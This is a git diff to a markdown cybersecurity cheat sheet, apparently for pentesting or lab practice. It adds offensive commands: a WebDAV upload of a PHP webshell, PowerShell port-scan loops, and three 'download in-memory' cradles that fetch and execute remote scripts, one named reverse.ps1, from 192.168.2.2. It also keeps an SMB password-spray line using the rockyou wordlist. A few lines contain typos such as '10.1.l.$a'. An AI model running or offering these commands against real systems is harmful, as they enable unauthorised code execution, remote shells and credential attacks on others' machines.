@@ -18,9 +18,6 @@ List of tools/resources for Cybersecurity
   - Wapiti (Lightweight scanner for GET/POST attack surfaces)
   - SQLmap (SQL Injection + Command execution within SQL)
   - XSStrike (XSS scanner with payload fuzzing)
-  - ```cat /usr/share/wordlists/rockyou.txt | grep -v "#" | grep -v "!" | grep -v "%" | grep -v "?" | grep -v "/" >> /usr/share/wordlists/rockyou3.txt```
-  - ```cadaver http://192.68.0.51/dav/```
-  - ```put webshell/phpshell.php```
 
     
 ### Important Commands
@@ -36,7 +33,14 @@ List of tools/resources for Cybersecurity
     - How to use? https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/
   - sudo mount -t cifs //target-IP/cyberq /mnt/cyberq -o guest
   - ```nxc smb 10.10.207.204 -u usernames.txt -p /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding```
-
+  - ```cat /usr/share/wordlists/rockyou.txt | grep -v "#" | grep -v "!" | grep -v "%" | grep -v "?" | grep -v "/" >> /usr/share/wordlists/rockyou3.txt```
+  - ```cadaver http://192.68.0.51/dav/```
+  - ```put webshell/phpshell.php```
+  - ```1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null```
+  - ```1..20 | % {$a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | %{echo ((new-object Net.Sockets.TcpClient).Connect("10.1.l.$a",$_)) "Port $_ is open!"} 2>$null}```
+  - ```iex (iwr 'http://192.168.2.2/file.ps1')``` -> Download in-memory
+  - ```iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')``` -> Download in-memory
+  - ```$down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1"); $read = $down.GetResponse(); IEX ([System.lO.StreamReader]($read.GetResponseStream())).ReadToEnd()``` -> Download in-memory
   - knockpy To discover subdomains
 
 ### SSRF, RCE, XXE, LFI Helpers
